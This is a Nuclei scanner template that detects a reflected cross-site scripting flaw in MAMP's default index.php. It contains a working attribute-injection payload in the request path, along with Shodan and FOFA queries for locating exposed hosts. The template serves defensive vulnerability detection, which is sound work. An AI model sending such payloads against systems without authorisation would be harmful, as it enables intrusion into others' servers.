http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - MAMP
    - test" onmouseover="alert(document.domain);" style
  - part: content_type
    type: word
    words:
    - text/html
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/index.php/test"%20onmouseover="alert(document.domain);"%20style="font-size:100000px;background-color:white";'
id: mamp-server-xss
info:
  author: ritikchaddha
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N
    cvss-score: 5.3
    cwe-id: CWE-79
  description: 'A Cross-Site Scripting (XSS) vulnerability exists in the default installation
    of MAMP server. The file `/Applications/MAMP/htdocs/index.php` is susceptible
    to malicious input, allowing attackers to inject JavaScript code that executes
    in the context of the victim''s browser. This vulnerability can be exploited without
    prior authentication.

    '
  impact: 'Exploiting this vulnerability can allow attackers to execute arbitrary
    JavaScript in the victim''s browser.

    '
  metadata:
    fofa-query: title="MAMP"
    max-request: 1
    shodan-query: title:"MAMP"
    verified: true
  name: MAMP Server - Cross-Site Scripting
  reference:
  - https://octagon.net/blog/2022/01/26/mamp-server-preauth-xss-leading-to-host-compromise-0day/
  remediation: 'Implement input validation and output encoding to sanitize user inputs.
    Apply the vendor-supplied patch or upgrade MAMP to a version where the vulnerability
    is resolved.

    '
  severity: medium
  tags: mamp,server,xss,vuln
